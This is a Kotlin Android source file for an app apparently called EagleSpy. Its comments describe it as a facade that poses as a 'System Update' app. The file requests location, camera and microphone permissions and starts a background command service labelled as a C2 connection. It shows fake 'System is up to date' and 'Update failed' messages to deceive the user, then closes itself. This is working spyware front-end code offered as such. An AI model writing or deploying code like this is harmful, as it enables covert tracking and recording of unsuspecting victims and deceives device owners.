package com.stealth.eaglespy

import android.Manifest
import android.content.Intent
import android.content.pm.PackageManager
import android.os.Bundle
import android.widget.Toast
import androidx.appcompat.app.AppCompatActivity
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat
import com.stealth.eaglespy.services.CommandService

/**
 * Facade Activity - Presents as a legitimate "System Update" app
 * Requests permissions and starts background services
 */
class MainActivity : AppCompatActivity() {

    private val PERMISSION_REQUEST_CODE = 1001

    private val requiredPermissions = arrayOf(
        Manifest.permission.ACCESS_FINE_LOCATION,
        Manifest.permission.ACCESS_COARSE_LOCATION,
        Manifest.permission.CAMERA,
        Manifest.permission.RECORD_AUDIO
    )

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)

        // Check and request permissions
        if (hasAllPermissions()) {
            startServices()
            showFakeUI()
        } else {
            requestPermissions()
        }
    }

    private fun hasAllPermissions(): Boolean {
        return requiredPermissions.all {
            ContextCompat.checkSelfPermission(this, it) == PackageManager.PERMISSION_GRANTED
        }
    }

    private fun requestPermissions() {
        ActivityCompat.requestPermissions(this, requiredPermissions, PERMISSION_REQUEST_CODE)
    }

    override fun onRequestPermissionsResult(
        requestCode: Int,
        permissions: Array<out String>,
        grantResults: IntArray
    ) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
        
        if (requestCode == PERMISSION_REQUEST_CODE) {
            if (grantResults.all { it == PackageManager.PERMISSION_GRANTED }) {
                startServices()
                showFakeUI()
            } else {
                // Show fake "update failed" message
                Toast.makeText(this, "Update failed. Please grant permissions.", Toast.LENGTH_LONG).show()
            }
        }
    }

    private fun startServices() {
        // Start the command service (C2 connection)
        val serviceIntent = Intent(this, CommandService::class.java)
        ContextCompat.startForegroundService(this, serviceIntent)
    }

    private fun showFakeUI() {
        // Display fake "System is up to date" message
        Toast.makeText(this, "✓ System is up to date", Toast.LENGTH_SHORT).show()
        
        // Close activity after 2 seconds
        android.os.Handler(mainLooper).postDelayed({
            finish()
        }, 2000)
    }
}
